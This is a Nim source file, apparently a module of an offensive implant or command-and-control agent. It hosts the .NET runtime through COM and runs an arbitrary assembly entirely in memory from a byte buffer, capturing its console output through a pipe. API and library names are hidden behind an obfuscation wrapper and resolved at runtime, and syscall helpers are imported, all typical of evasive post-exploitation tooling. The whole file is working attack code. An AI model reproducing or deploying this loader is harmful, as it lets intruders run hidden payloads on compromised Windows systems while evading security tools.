import std/json
from std/strutils import toHex
import ../../utils/global
import ../../utils/general/strings
import ../../utils/winapi/handlers
import ../../utils/winapi/syscall
import ../../utils/winapi/utils
import ../../utils/msg

const
  sOk = culong(0)
  vtUi1 = uint16(17)
  vtBstr = uint16(8)
  vtVariant = uint16(12)
  vtArray = uint16(0x2000)
  coinitMultithreaded = culong(0)
  slotMetaGetRuntime = 3
  slotRuntimeGetInterface = 9
  slotRuntimeIsLoadable = 10
  slotCorStart = 10
  slotCorStop = 11
  slotCorCreateDomain = 12
  slotCorUnloadDomain = 20
  slotAppDomainLoad3 = 45
  slotAssemblyEntryPoint = 16
  slotMethodGetParameters = 18
  slotMethodInvoke3 = 37
  handleFlagInherit = 1'u32
  stdOutputHandle = 0xFFFFFFF5'u32
  stdErrorHandle = 0xFFFFFFF4'u32
  inlinePollMs = 200'u32
  inlineMaxWaitMs = 300000'u32
  waitObject0 = 0'u32
  waitTimeout = 258'u32

type
  WinGuid = object
    data1: culong
    data2, data3: uint16
    data4: array[8, byte]

  SafeArrayBound = object
    cElements: culong
    lLbound: clong

proc setupPipe(hRead, hWrite: ptr pointer): bool =
  # Creates an anonymous pipe for captured output
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 1,
  )
  if createPipe(hRead, hWrite, addr sa, 1024 * 1024) == 0:
    return false
  setHandleInformation(hRead[], handleFlagInherit, 0) != 0

proc ensureDotnetConsole(): void =
  # Allocates a console when the process has none
  type
    TGetConsoleWindow = proc (): pointer {.stdcall.}
    TAllocConsole = proc (): culong {.stdcall.}
  let getCw = cast[TGetConsoleWindow](load(obf("GetConsoleWindow")))
  if getCw == nil or getCw() != nil: return
  let alloc = cast[TAllocConsole](load(obf("AllocConsole")))
  if alloc != nil: discard alloc()

proc peekPipeBytes(hRead: pointer): culong =
  # Reads how many bytes are waiting on the pipe
  var avail: culong = 0
  if peekNamedPipe(hRead, nil, 0, nil, addr avail, nil) == 0:
    0
  else:
    avail

proc readPipeChunk(hRead: pointer; buf: var openArray[char]; pos: int): int =
  # Reads one chunk from the pipe into the output buffer
  if pos >= buf.len: return 0
  var avail = peekPipeBytes(hRead)
  if avail == 0: return 0
  let want = min(int(avail), buf.len - pos)
  var chunk: array[4096, byte]
  let toRead = min(want, chunk.len)
  let rd = readFile(hRead, addr chunk[0], culong(toRead))
  if rd == 0: return 0
  copyMem(addr buf[pos], addr chunk[0], int(rd))
  int(rd)

proc drainPipe(hRead: pointer; buf: var openArray[char]; pos: int): int =
  # Drains the pipe until no more bytes are waiting
  var n = pos
  var discardChunk: array[4096, byte]
  while true:
    if n < buf.len:
      let rd = readPipeChunk(hRead, buf, n)
      if rd == 0: break
      n += rd
    else:
      let rd = readFile(hRead, addr discardChunk[0], culong(discardChunk.len))
      if rd == 0: break
  n

type
  DotnetInvokeCtx = object
    methodInfo*, methodArgs*: pointer
    objVariant*: array[24, byte]
    retVariant*: array[24, byte]
    hr*: culong

proc dotnetInvokeThreadEntry(param: pointer): culong {.stdcall.} =
  # Thread entry that invokes the assembly method
  type TMethodInvoke3 = proc(self: pointer; obj: pointer; parameters: pointer; ret: pointer): culong {.stdcall.}
  let ctx = cast[ptr DotnetInvokeCtx](param)
  let vtblPtr = cast[ptr pointer](ctx.methodInfo)
  let invoke = cast[TMethodInvoke3](cast[ptr UncheckedArray[pointer]](vtblPtr[])[slotMethodInvoke3])
  ctx.hr = invoke(ctx.methodInfo, addr ctx.objVariant[0], ctx.methodArgs, addr ctx.retVariant[0])
  0

proc waitThreadAndDrainPipe(hThread, hRead: pointer; buf: var openArray[char]): tuple[pos: int, waitRet: culong] =
  # Waits on the thread and drains pipe output until it ends
  var pos = 0
  let start = getTickCount()
  var waitRet: culong = culong(waitTimeout)
  while true:
    if peekPipeBytes(hRead) > 0:
      pos = drainPipe(hRead, buf, pos)
    waitRet = waitForSingleObjectEx(hThread, culong(inlinePollMs))
    if waitRet == culong(waitObject0): break
    if getTickCount() - start >= inlineMaxWaitMs: break
  pos = drainPipe(hRead, buf, pos)
  (pos, waitRet)

proc closePipe(h: pointer) =
  # Closes a pipe handle
  discard closeHandle(h)

proc runDotnetInline*(payload: openArray[byte]; params: string; buf: var openArray[char]): int =
  # Main function that loads and runs a dotnet assembly inline
  if payload.len == 0:
    return writeErr(obf("empty assembly"), buf)
  if payload.len < 64 or payload[0] != 0x4D'u8 or payload[1] != 0x5A'u8:
    return writeErr(obf("invalid PE assembly"), buf)

  type
    TCoInitializeEx = proc(reserved: pointer; flags: culong): culong {.stdcall.}
    TCoUninitialize = proc() {.stdcall.}
    TCLRCreateInstance = proc(clsid, riid: pointer; iface: ptr pointer): culong {.stdcall.}
    TComRelease = proc(self: pointer): culong {.stdcall.}
    TComQueryInterface = proc(self: pointer; riid: pointer; ppv: ptr pointer): culong {.stdcall.}
    TMetaGetRuntime = proc(self: pointer; version: pointer; riid: pointer; runtime: ptr pointer): culong {.stdcall.}
    TRuntimeGetInterface = proc(self: pointer; clsid, riid: pointer; iface: ptr pointer): culong {.stdcall.}
    TRuntimeIsLoadable = proc(self: pointer; loadable: ptr culong): culong {.stdcall.}
    TCorStart = proc(self: pointer): culong {.stdcall.}
    TCorStop = proc(self: pointer): culong {.stdcall.}
    TCorCreateDomain = proc(self: pointer; name: pointer; identity: pointer; appDomain: ptr pointer): culong {.stdcall.}
    TCorUnloadDomain = proc(self: pointer; appDomain: pointer): culong {.stdcall.}
    TAppDomainLoad3 = proc(self: pointer; rawAssembly: pointer; assembly: ptr pointer): culong {.stdcall.}
    TAssemblyEntryPoint = proc(self: pointer; entry: ptr pointer): culong {.stdcall.}
    TMethodGetParameters = proc(self: pointer; ret: ptr pointer): culong {.stdcall.}
    TMethodInvoke3 = proc(self: pointer; obj: pointer; parameters: pointer; ret: pointer): culong {.stdcall.}
    TSafeArrayGetUBound = proc(psa: pointer; nDim: culong; pUbound: ptr clong): culong {.stdcall.}
    TSafeArrayCreate = proc(elemType: uint16; dims: culong; bounds: pointer): pointer {.stdcall.}
    TSafeArrayCreateVector = proc(elemType: uint16; lower, count: clong): pointer {.stdcall.}
    TSafeArrayAccessData = proc(psa: pointer; data: ptr pointer): culong {.stdcall.}
    TSafeArrayUnaccessData = proc(psa: pointer): culong {.stdcall.}
    TSafeArrayPutElement = proc(psa: pointer; idx: ptr clong; elem: pointer): culong {.stdcall.}
    TSafeArrayDestroy = proc(psa: pointer): culong {.stdcall.}
    TSysAllocString = proc(str: pointer): pointer {.stdcall.}
    TCommandLineToArgvW = proc(cmd: pointer; argc: ptr cint): pointer {.stdcall.}

  const
    iidClrMetaHost = WinGuid(
      data1: 0xD332DB9E'u32, data2: 0xB9B3'u16, data3: 0x4125'u16,
      data4: [0x82'u8, 0x07'u8, 0xA1'u8, 0x48'u8, 0x84'u8, 0xF5'u8, 0x32'u8, 0x16'u8])
    iidClrRuntimeInfo = WinGuid(
      data1: 0xBD39D1D2'u32, data2: 0xBA2F'u16, data3: 0x486a'u16,
      data4: [0x89'u8, 0xB0'u8, 0xB4'u8, 0xB0'u8, 0xCB'u8, 0x46'u8, 0x68'u8, 0x91'u8])
    clsidClrMetaHost = WinGuid(
      data1: 0x9280188d'u32, data2: 0x0E8E'u16, data3: 0x4867'u16,
      data4: [0xb3'u8, 0x0c'u8, 0x7f'u8, 0xa8'u8, 0x38'u8, 0x84'u8, 0xe8'u8, 0xde'u8])
    clsidCorRuntimeHost = WinGuid(
      data1: 0xcb2f6723'u32, data2: 0xab3a'u16, data3: 0x11d2'u16,
      data4: [0x9c'u8, 0x40'u8, 0x00'u8, 0xc0'u8, 0x4f'u8, 0xa3'u8, 0x0a'u8, 0x3e'u8])
    iidCorRuntimeHost = WinGuid(
      data1: 0xcb2f6722'u32, data2: 0xab3a'u16, data3: 0x11d2'u16,
      data4: [0x9c'u8, 0x40'u8, 0x00'u8, 0xc0'u8, 0x4f'u8, 0xa3'u8, 0x0a'u8, 0x3e'u8])
    iidAppDomain = WinGuid(
      data1: 0x05F696DC'u32, data2: 0x2B29'u16, data3: 0x3663'u16,
      data4: [0xAD'u8, 0x8B'u8, 0xC4'u8, 0x38'u8, 0x9C'u8, 0xF2'u8, 0xA7'u8, 0x13'u8])
    netV4Sig: array[10, byte] = [0x76'u8, 0x34'u8, 0x2E'u8, 0x30'u8, 0x2E'u8, 0x33'u8, 0x30'u8, 0x33'u8, 0x31'u8, 0x39'u8]

  template comSlot(obj: pointer; idx: int): untyped =
    # Reads one slot from a com object vtable
    let vtblPtr = cast[ptr pointer](obj)
    cast[ptr UncheckedArray[pointer]](vtblPtr[])[idx]

  template restoreIo(hOrigOut, hOrigErr, hWrite, hRead: pointer) =
    # Restores the original standard handles and closes the pipe
    discard setStdHandle(stdOutputHandle, hOrigOut)
    discard setStdHandle(stdErrorHandle, hOrigErr)
    if hWrite != nil: closePipe(hWrite)
    if hRead != nil: closePipe(hRead)

  var argsLine = ""
  try:
    var p = parseJson(params)
    if p.kind == JString:
      let inner = p.getStr()
      if inner.len > 0: p = parseJson(inner)
    if p.kind == JObject and p.hasKey(obf("args")):
      argsLine = p[obf("args")].getStr()
  except JsonParsingError:
    discard

  ensureDotnetConsole()
  var hRead, hWrite: pointer
  if not setupPipe(addr hRead, addr hWrite):
    return writeErr(obf("CreatePipe failed"), buf)
  let hOrigOut = getStdHandle(stdOutputHandle)
  let hOrigErr = getStdHandle(stdErrorHandle)
  discard setStdHandle(stdOutputHandle, hWrite)
  discard setStdHandle(stdErrorHandle, hWrite)

  let ole32 = loadLibraryA(obf("ole32.dll"))
  if ole32 == nil:
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("ole32 load failed"), buf)
  let coInit = cast[TCoInitializeEx](getProcAddress(ole32, obf("CoInitializeEx")))
  let coUninit = cast[TCoUninitialize](getProcAddress(ole32, obf("CoUninitialize")))
  if coInit == nil or coUninit == nil:
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("COM init failed"), buf)
  discard coInit(nil, coinitMultithreaded)

  let mscoree = loadLibraryA(obf("mscoree.dll"))
  if mscoree == nil:
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("mscoree load failed"), buf)
  let clrCreateInstance = cast[TCLRCreateInstance](getProcAddress(mscoree, obf("CLRCreateInstance")))
  if clrCreateInstance == nil:
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLRCreateInstance missing"), buf)

  let oleaut = loadLibraryA(obf("oleaut32.dll"))
  let shell32 = loadLibraryA(obf("shell32.dll"))
  if oleaut == nil or shell32 == nil:
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("oleaut32/shell32 load failed"), buf)
  let safeArrayCreate = cast[TSafeArrayCreate](getProcAddress(oleaut, obf("SafeArrayCreate")))
  let safeArrayCreateVector = cast[TSafeArrayCreateVector](getProcAddress(oleaut, obf("SafeArrayCreateVector")))
  let safeArrayAccessData = cast[TSafeArrayAccessData](getProcAddress(oleaut, obf("SafeArrayAccessData")))
  let safeArrayUnaccessData = cast[TSafeArrayUnaccessData](getProcAddress(oleaut, obf("SafeArrayUnaccessData")))
  let safeArrayPutElement = cast[TSafeArrayPutElement](getProcAddress(oleaut, obf("SafeArrayPutElement")))
  let safeArrayDestroy = cast[TSafeArrayDestroy](getProcAddress(oleaut, obf("SafeArrayDestroy")))
  let sysAllocString = cast[TSysAllocString](getProcAddress(oleaut, obf("SysAllocString")))
  let commandLineToArgvW = cast[TCommandLineToArgvW](getProcAddress(shell32, obf("CommandLineToArgvW")))
  let safeArrayGetUBound = cast[TSafeArrayGetUBound](getProcAddress(oleaut, obf("SafeArrayGetUBound")))
  if safeArrayCreate == nil or safeArrayCreateVector == nil or safeArrayAccessData == nil or
     safeArrayUnaccessData == nil or safeArrayPutElement == nil or safeArrayDestroy == nil or
     sysAllocString == nil or commandLineToArgvW == nil or safeArrayGetUBound == nil:
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR helper API missing"), buf)

  var netTag = obf("v4.0.30319")
  for i in 0 .. payload.len - netV4Sig.len:
    var hit = true
    for j in 0 ..< netV4Sig.len:
      if payload[i + j] != netV4Sig[j]:
        hit = false
        break
    if hit:
      netTag = obf("v4.0.30319")
      break

  var netVer: array[32, uint16]
  asciiWide(netTag, netVer)
  var appDomName: array[64, uint16]
  asciiWide(obf("AppDomain"), appDomName)

  var metaHost: pointer = nil
  var runtimeInfo: pointer = nil
  var corHost: pointer = nil
  var appDomainThunk: pointer = nil
  var appDomain: pointer = nil
  var assemblyObj: pointer = nil
  var methodInfo: pointer = nil
  var asmSafeArray: pointer = nil
  var methodArgs: pointer = nil
  var argBstrArray: pointer = nil
  var hr: culong

  hr = clrCreateInstance(addr clsidClrMetaHost, addr iidClrMetaHost, addr metaHost)
  if hr != sOk or metaHost == nil:
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLRCreateInstance failed"), buf, culong(hr))

  hr = cast[TMetaGetRuntime](comSlot(metaHost, slotMetaGetRuntime))(
    metaHost, addr netVer[0], addr iidClrRuntimeInfo, addr runtimeInfo)
  if hr != sOk or runtimeInfo == nil:
    if metaHost != nil: discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR GetRuntime failed"), buf, culong(hr))

  var loadable: culong = 0
  hr = cast[TRuntimeIsLoadable](comSlot(runtimeInfo, slotRuntimeIsLoadable))(runtimeInfo, addr loadable)
  if hr != sOk or loadable == 0:
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR runtime not loadable"), buf)

  hr = cast[TRuntimeGetInterface](comSlot(runtimeInfo, slotRuntimeGetInterface))(
    runtimeInfo, addr clsidCorRuntimeHost, addr iidCorRuntimeHost, addr corHost)
  if hr != sOk or corHost == nil:
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR GetInterface failed"), buf, culong(hr))

  hr = cast[TCorStart](comSlot(corHost, slotCorStart))(corHost)
  if hr != sOk:
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR Start failed"), buf, culong(hr))

  hr = cast[TCorCreateDomain](comSlot(corHost, slotCorCreateDomain))(
    corHost, addr appDomName[0], nil, addr appDomainThunk)
  if hr != sOk or appDomainThunk == nil:
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("CLR CreateDomain failed"), buf, culong(hr))

  hr = cast[TComQueryInterface](comSlot(appDomainThunk, 0))(
    appDomainThunk, addr iidAppDomain, addr appDomain)
  if hr != sOk or appDomain == nil:
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("AppDomain QI failed"), buf, culong(hr))

  var bound = SafeArrayBound(cElements: culong(payload.len), lLbound: 0)
  asmSafeArray = safeArrayCreate(vtUi1, 1, addr bound)
  if asmSafeArray == nil:
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("SafeArrayCreate failed"), buf)

  var asmData: pointer = nil
  hr = safeArrayAccessData(asmSafeArray, addr asmData)
  if hr != sOk or asmData == nil:
    discard safeArrayDestroy(asmSafeArray)
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("SafeArrayAccessData failed"), buf, culong(hr))

  copyMem(asmData, unsafeAddr payload[0], payload.len)
  hr = safeArrayUnaccessData(asmSafeArray)
  if hr != sOk:
    discard safeArrayDestroy(asmSafeArray)
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("SafeArrayUnaccessData failed"), buf, culong(hr))

  hr = cast[TAppDomainLoad3](comSlot(appDomain, slotAppDomainLoad3))(
    appDomain, asmSafeArray, addr assemblyObj)
  if hr != sOk or assemblyObj == nil:
    discard safeArrayDestroy(asmSafeArray)
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("AppDomain Load failed"), buf, culong(hr))

  hr = cast[TAssemblyEntryPoint](comSlot(assemblyObj, slotAssemblyEntryPoint))(
    assemblyObj, addr methodInfo)
  if hr != sOk or methodInfo == nil:
    discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
    discard safeArrayDestroy(asmSafeArray)
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("Assembly EntryPoint failed"), buf, culong(hr))

  var entryParamCount: clong = -1
  var entryParamsSa: pointer = nil
  discard cast[TMethodGetParameters](comSlot(methodInfo, slotMethodGetParameters))(
    methodInfo, addr entryParamsSa)
  if entryParamsSa != nil:
    var ubound: clong = -1
    if safeArrayGetUBound(entryParamsSa, 1, addr ubound) == sOk:
      entryParamCount = ubound + 1
    discard safeArrayDestroy(entryParamsSa)

  if entryParamCount == 0:
    methodArgs = safeArrayCreateVector(vtVariant, 0, 0)
  else:
    var argc: cint = 0
    var argv: pointer = nil
    var cmdWide: seq[uint16] = @[]
    if argsLine.len > 0:
      var cmdPrefix = obf("a.exe ")
      for ch in cmdPrefix:
        cmdWide.add uint16(ord(ch))
      for ch in argsLine:
        cmdWide.add uint16(ord(ch))
      cmdWide.add 0'u16
      argv = commandLineToArgvW(addr cmdWide[0], addr argc)
    if argv != nil and argc > 1:
      argv = cast[pointer](cast[int](argv) + sizeof(pointer))
      argc -= 1

    argBstrArray = safeArrayCreateVector(vtBstr, 0, argc)
    if argBstrArray == nil:
      discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
      discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
      discard safeArrayDestroy(asmSafeArray)
      discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
      discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
      discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
      discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
      discard cast[TComRelease](comSlot(corHost, 2))(corHost)
      discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
      discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
      coUninit()
      restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
      return writeErr(obf("argument SafeArray failed"), buf)

    if argc > 0:
      let argvArr = cast[ptr UncheckedArray[pointer]](argv)
      for i in 0 ..< argc:
        var idx = clong(i)
        let bstr = sysAllocString(argvArr[i])
        hr = safeArrayPutElement(argBstrArray, addr idx, bstr)
        if hr != sOk:
          discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
          discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
          discard safeArrayDestroy(argBstrArray)
          discard safeArrayDestroy(asmSafeArray)
          discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
          discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
          discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
          discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
          discard cast[TComRelease](comSlot(corHost, 2))(corHost)
          discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
          discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
          coUninit()
          restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
          return writeErr(obf("argument pack failed"), buf, culong(hr))

    methodArgs = safeArrayCreateVector(vtVariant, 0, 1)
    if methodArgs == nil:
      discard safeArrayDestroy(argBstrArray)
      discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
      discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
      discard safeArrayDestroy(asmSafeArray)
      discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
      discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
      discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
      discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
      discard cast[TComRelease](comSlot(corHost, 2))(corHost)
      discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
      discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
      coUninit()
      restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
      return writeErr(obf("method args SafeArray failed"), buf)

    var vtPsa: array[24, byte]
    zeroMem(addr vtPsa[0], vtPsa.len)
    cast[ptr uint16](addr vtPsa[0])[] = vtArray or vtBstr
    cast[ptr pointer](addr vtPsa[8])[] = argBstrArray
    var idx0: clong = 0
    hr = safeArrayPutElement(methodArgs, addr idx0, addr vtPsa[0])
    if hr != sOk:
      discard safeArrayDestroy(methodArgs)
      discard safeArrayDestroy(argBstrArray)
      discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
      discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
      discard safeArrayDestroy(asmSafeArray)
      discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
      discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
      discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
      discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
      discard cast[TComRelease](comSlot(corHost, 2))(corHost)
      discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
      discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
      coUninit()
      restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
      return writeErr(obf("method args pack failed"), buf, culong(hr))

  if methodArgs == nil:
    discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
    discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
    discard safeArrayDestroy(asmSafeArray)
    discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("method args SafeArray failed"), buf)

  var invokeCtx = cast[ptr DotnetInvokeCtx](alloc0(sizeof(DotnetInvokeCtx)))
  invokeCtx.methodInfo = methodInfo
  invokeCtx.methodArgs = methodArgs

  inc bgWorkers
  let hInvoke = createThread(cast[pointer](dotnetInvokeThreadEntry), invokeCtx)
  if hInvoke == nil:
    dec bgWorkers
    dealloc(invokeCtx)
    if methodInfo != nil: discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
    if assemblyObj != nil: discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
    if methodArgs != nil: discard safeArrayDestroy(methodArgs)
    if argBstrArray != nil: discard safeArrayDestroy(argBstrArray)
    if asmSafeArray != nil: discard safeArrayDestroy(asmSafeArray)
    if appDomain != nil: discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
    if appDomainThunk != nil:
      discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
      discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
    if corHost != nil:
      discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
      discard cast[TComRelease](comSlot(corHost, 2))(corHost)
    if runtimeInfo != nil: discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
    if metaHost != nil: discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
    coUninit()
    restoreIo(hOrigOut, hOrigErr, hWrite, hRead)
    return writeErr(obf("invoke thread failed"), buf)

  let drained = waitThreadAndDrainPipe(hInvoke, hRead, buf)
  discard waitForObject(hInvoke)
  discard ntCloseHandle(hInvoke)
  dec bgWorkers
  hr = invokeCtx.hr
  dealloc(invokeCtx)

  if methodInfo != nil: discard cast[TComRelease](comSlot(methodInfo, 2))(methodInfo)
  if assemblyObj != nil: discard cast[TComRelease](comSlot(assemblyObj, 2))(assemblyObj)
  if methodArgs != nil: discard safeArrayDestroy(methodArgs)
  if argBstrArray != nil: discard safeArrayDestroy(argBstrArray)
  if asmSafeArray != nil: discard safeArrayDestroy(asmSafeArray)
  if appDomain != nil: discard cast[TComRelease](comSlot(appDomain, 2))(appDomain)
  if appDomainThunk != nil:
    discard cast[TCorUnloadDomain](comSlot(corHost, slotCorUnloadDomain))(corHost, appDomainThunk)
    discard cast[TComRelease](comSlot(appDomainThunk, 2))(appDomainThunk)
  if corHost != nil:
    discard cast[TCorStop](comSlot(corHost, slotCorStop))(corHost)
    discard cast[TComRelease](comSlot(corHost, 2))(corHost)
  if runtimeInfo != nil: discard cast[TComRelease](comSlot(runtimeInfo, 2))(runtimeInfo)
  if metaHost != nil: discard cast[TComRelease](comSlot(metaHost, 2))(metaHost)
  coUninit()

  discard setStdHandle(stdOutputHandle, hOrigOut)
  discard setStdHandle(stdErrorHandle, hOrigErr)
  closePipe(hWrite)
  let n = drainPipe(hRead, buf, drained.pos)
  closePipe(hRead)

  if hr != sOk:
    if n > 0: return n
    return writeErr(obf("assembly invoke failed"), buf, culong(hr))
  if n > 0:
    n
  else:
    writeMsg(obf("Executed. No output."), buf)
